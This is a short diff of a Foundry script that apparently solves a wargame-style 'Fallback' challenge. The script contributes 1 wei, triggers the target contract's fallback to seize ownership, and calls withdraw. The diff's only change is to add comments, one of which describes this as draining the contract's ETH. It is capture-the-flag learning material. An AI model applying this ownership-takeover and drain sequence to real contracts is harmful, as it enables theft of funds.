@@ -12,12 +12,12 @@ contract FallbackSolution is Script {
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        fallbackIns.contribute{value: 1 wei}();
+        fallbackIns.contribute{value: 1 wei}(); // Call the contribute function with some wei
         (bool success, ) = address(fallbackIns).call{value: 1 wei}("");
         require(success, "Transaction failed");
         console.log("New Owner: ", fallbackIns.owner());
         console.log("My address: ", vm.envAddress("MY_ADDRESS"));
-        fallbackIns.withdraw();
+        fallbackIns.withdraw(); // Drain the contract's ETH by calling the withdraw function.
 
         vm.stopBroadcast();
     }
